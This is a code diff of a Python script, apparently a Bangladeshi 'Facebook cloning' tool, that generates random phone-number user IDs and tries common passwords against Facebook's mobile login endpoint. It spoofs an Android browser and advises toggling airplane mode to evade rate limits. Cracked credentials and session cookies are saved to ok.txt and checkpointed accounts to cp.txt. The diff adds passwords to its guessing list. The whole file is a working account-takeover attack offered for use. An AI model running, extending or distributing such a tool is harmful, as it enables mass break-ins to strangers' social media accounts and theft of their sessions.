@@ -1,57 +1,49 @@
 import os, time, sys, uuid, random, requests
 
-# কালার কোড
-G = '\033[1;32m' # Green
-W = '\033[1;37m' # White
-R = '\033[1;31m' # Red
-Y = '\033[1;33m' # Yellow
-
 def banner():
     os.system('clear')
-    print(f"""{G}
+    print(f"""\033[1;32m
      ███    ███  ███████  ████████  █████  
      ████  ████  ██          ██    ██   ██ 
      ██ ████ ██  █████       ██    ███████ 
      ██  ██  ██  ██          ██    ██   ██ 
      ██      ██  ███████     ██    ██   ██ 
-{W}×××××××××××××××××××××××××××××××××××××××××××××××××
-{G} [✓] CREATED BY : MD MALEK ISLAM (META REAL)
- [✓] METHOD     : RESPONSE LOGIC (MAX PRO)
-{W}×××××××××××××××××××××××××××××××××××××××××××××××××""")
+\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××××
+\033[1;32m [✓] CREATED BY : MD MALEK ISLAM (META REAL)
+ [✓] METHOD     : VIP SUCCESS LOGIC (MAX PRO)
+\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××××""")
 
 def main():
     banner()
-    print(f'{G}[1] START RANDOM CLONING (REAL)')
-    print(f'[0] EXIT')
-    choose = input(f'\n{G}[?] CHOICE: {W}')
+    print('\033[1;32m[1] START VIP CLONING (REAL)')
+    print('[0] EXIT')
+    choose = input('\n\033[1;32m[?] CHOICE: \033[1;37m')
     if choose == '1': cloning()
     else: sys.exit()
 
 def cloning():
     banner()
-    code = input(f'{G}[+] SIM CODE (017, 018, 019): {W}')
-    limit = int(input(f'{G}[+] LIMIT (3000-5000): {W}'))
+    code = input('\033[1;32m[+] SIM CODE (017, 018, 019): \033[1;37m')
+    limit = int(input('\033[1;32m[+] LIMIT (5000): \033[1;37m'))
     
     banner()
-    print(f'{G}[+] TARGET DOMAIN: RANDOM CLONING')
-    print(f'[+] AIRPLANE MODE: EVERY 200 IDS')
-    print(f'{W}×××××××××××××××××××××××××××××××××××××××××××××××××\n')
+    print('\033[1;32m[+] TARGET: VIP RANDOM CLONING')
+    print('[+] TIP: AIRPLANE MODE EVERY 100 IDS')
+    print('\033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××××\n')
     
-    ok = 0
-    cp = 0
-    loop = 0
+    ok, cp, loop = 0, 0, 0
     
     for i in range(limit):
         loop += 1
-        # স্যারের দেওয়া আসল UID লজিক
         uid = f"{code}{random.randint(1111111, 9999999)}"
         
-        # সংশোধিত পাসওয়ার্ড লজিক (৬+ অক্ষরের নিয়ম মেনে)
-        pws = [uid, uid[5:], uid[4:], 'bangladesh', '786786', '708090']
+        # --- আপনার জন্য সাজানো সেই ভিআইপি পাসওয়ার্ড লিস্ট ---
+        pws = [uid, uid[5:], uid[4:], '708090', '445566', '102030', 'bangladesh', 'i love you', code+uid[5:], code+uid[4:]]
         
         for pw in pws:
-            # প্রো-হেডার (Android 14)
-            ua = f"Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
+            if len(pw) < 6: continue # ফেসবুক ৬ অক্ষরের কম পাসওয়ার্ড নেয় না
+            
+            ua = "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
             
             headers = {
                 'authority': 'm.facebook.com',
@@ -63,37 +55,22 @@ def cloning():
                 'user-agent': ua,
             }
 
-            data = {
-                'lsd': uuid.uuid4().hex,
-                'jazoest': '2' + str(random.randint(1000, 9999)),
-                'email': uid,
-                'pass': pw,
-                'login': 'Log In'
-            }
-
+            data = {'lsd': uuid.uuid4().hex, 'jazoest': '2'+str(random.randint(1000, 9999)), 'email': uid, 'pass': pw, 'login': 'Log In'}
             url = "https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100"
             
-            sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}] [CP:{cp}]'); sys.stdout.flush()
+            sys.stdout.write(f'\r\033[1;32m[MALEK-VIP] {loop}/{limit} [OK:{ok}] [CP:{cp}]'); sys.stdout.flush()
 
             try:
                 res = requests.post(url, headers=headers, data=data, allow_redirects=False, timeout=15)
-                
                 if "c_user" in res.cookies.get_dict():
                     ok += 1
                     cookie = ";".join([f"{k}={v}" for k, v in res.cookies.get_dict().items()])
-                    print(f'\n{G}[MALEK-OK💚] {uid} | {pw}') 
-                    print(f'{G}[🍪] COOKIE = {cookie}\n')
-                    with open('ok.txt', 'a') as f: f.write(f'{uid}|{pw}|{cookie}\n')
-                    break 
+                    print(f'\n\033[1;32m[OK💚] {uid} | {pw}\n[🍪] {cookie}\n')
+                    open('ok.txt', 'a').write(f'{uid}|{pw}|{cookie}\n'); break 
                 elif "checkpoint" in res.cookies.get_dict():
                     cp += 1
-                    print(f'\n{Y}[MALEK-CP💛] {uid} | {pw}')
-                    with open('cp.txt', 'a') as f: f.write(f'{uid}|{pw}\n')
-                    break
-            except:
-                time.sleep(2)
+                    print(f'\n\033[1;33m[CP💛] {uid} | {pw}')
+                    open('cp.txt', 'a').write(f'{uid}|{pw}\n'); break
+            except: time.sleep(2)
 
-    print(f'\n{G}[+] সাকসেস! সব রেজাল্ট ok.txt ফাইলে আছে।')
-
-if __name__ == "__main__":
-    main()
+if __name__ == "__main__": main()
